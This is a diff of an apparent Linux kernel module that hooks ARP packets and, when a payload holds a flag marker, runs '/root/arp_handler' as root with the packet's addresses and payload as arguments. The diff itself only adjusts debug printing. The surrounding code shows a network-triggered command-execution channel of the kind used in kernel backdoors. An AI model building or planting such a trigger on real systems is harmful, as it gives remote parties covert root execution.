@@ -74,8 +74,9 @@ struct arp_work {
 
 /* Function to be run by the workqueue */
 static void arp_exec_work(struct work_struct *work) {
+    printk(KERN_DEBUG "Entiner arp_exec_work...");
+    printk(KERN_DEBUG "Queue length: %d", atomic_read(&work_count));
     struct arp_work *my_arp_work = container_of(work, struct arp_work, work);
-    printk(KERN_DEBUG "arp_work accessed... queue length: %d", atomic_read(&work_count));
 
     char src_hw_str[18], src_proto_str[16], dst_hw_str[18], dst_proto_str[16];
     
@@ -87,11 +88,10 @@ static void arp_exec_work(struct work_struct *work) {
     char *argv[] = { "/root/arp_handler", src_hw_str, src_proto_str, dst_hw_str, dst_proto_str, my_arp_work->payload, NULL };
     char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 
-    printk(KERN_INFO "ARP request detected, entering usermode\n");
-
     // Debug printing
-    printk(KERN_INFO "Executing: %s %s %s %s %s %s\n", argv[0], argv[1], argv[2], argv[3], argv[4], argv[5]);
+    printk(KERN_DEBUG "Executing: %s %s %s %s %s %s\n", argv[0], argv[1], argv[2], argv[3], argv[4], argv[5]);
     /* Execute user-level command */
+    printk(KERN_INFO "Entering usermode\n");
     call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
     atomic_dec(&work_count);
     kfree(my_arp_work);
@@ -154,6 +154,7 @@ unsigned int arp_exec_hook(void *priv, struct sk_buff *skb,
             payload_len = PAYLOAD_LEN;
         }
         strncpy(work->payload, arp_payload, payload_len); 
+        printk(KERN_DEBUG "%hd %hd %hd %hd %hd %hd %hd %hd", work->payload[0], work->payload[1], work->payload[2], work->payload[3], work->payload[4], work->payload[5], work->payload[6], work->payload[7]);
 
         if(payload_len < strlen(FLAG)){
             printk(KERN_INFO "No payload");
